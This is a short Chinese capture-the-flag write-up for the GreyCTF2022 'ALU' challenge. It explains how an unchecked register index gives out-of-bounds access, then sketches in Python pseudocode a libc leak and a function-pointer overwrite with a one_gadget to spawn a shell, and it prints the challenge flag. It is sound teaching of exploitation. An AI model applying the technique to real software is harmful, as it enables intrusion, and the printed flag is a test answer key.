# GreyCTF2022 - ALU

## 题目简述

程序模拟一个带 26 个寄存器的 ALU。寄存器名通过字符减 `'a'` 转成下标，却没有验证结果必须位于 $[0,25]$，因此特殊字符可把 ALU 指令变成相对全局寄存器数组的越界读写原语。

## 解题过程

反汇编并标记 `regs` 周围的全局对象，计算每个目标地址对应的伪寄存器字符。利用 ALU 的 move/arithmetic 指令先把附近保存的 libc 指针搬入合法寄存器，从泄露值求 libc 基址；再通过 OOB 写调整一个退出阶段会使用的函数指针。

```python
def reg_for(addr):
    index = (addr - regs_addr) // 8
    return bytes([(ord('a') + index) & 0xff])

# 伪代码：OOB load -> 泄露 libc -> OOB store one_gadget
send_insn(b'mov a ' + reg_for(leak_slot))
leak = read_reg(b'a')
libc_base = leak - known_offset
send_value(reg_for(callback_slot), libc_base + one_gadget_offset)
```

退出解释器时被修改的指针被调用，满足寄存器/栈约束的 one-gadget 执行并取得 shell，flag 为：

```text
grey{b6bee86b92aa5d4cd85bda82bd0e0317}
```

## 方法总结

自定义 VM 或解释器也要按常规内存破坏题检查索引换算。将“字符操作数”还原成整数下标后，逐个映射越界范围内的对象，通常比盲扫更可靠。one-gadget 还需核对触发点约束，不能只计算地址。
